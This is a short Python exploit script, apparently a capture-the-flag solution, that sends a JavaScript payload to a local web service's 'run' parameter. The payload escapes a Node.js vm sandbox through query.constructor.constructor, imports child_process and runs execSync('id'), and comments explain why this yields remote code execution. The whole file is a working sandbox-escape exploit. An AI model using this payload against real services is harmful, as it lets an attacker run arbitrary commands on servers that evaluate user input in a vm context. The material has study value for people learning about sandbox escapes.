import httpx

URL = "http://localhost:80"


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)


class API(BaseAPI):
    def run(s, run):
        return s.c.get("/", params={"run": run})


if __name__ == "__main__":
    api = API()
    # In the current context (vm context), we can't import the child_process module directly.
    # To import child_process, we need get another context.
    # We'll construct a function using query.constructor.constructor.
    # Interestingly, since 'query' originates from a context outside of the vm context,
    # it can import modules like 'child_process,' potentially leading to Remote Code Execution (RCE).
    res = api.run("""
                  this.toString=()=>query.constructor.constructor("return import('child_process').then(cp=>cp.execSync('id').toString())")();
                  this
                  """)
    print(res.text)
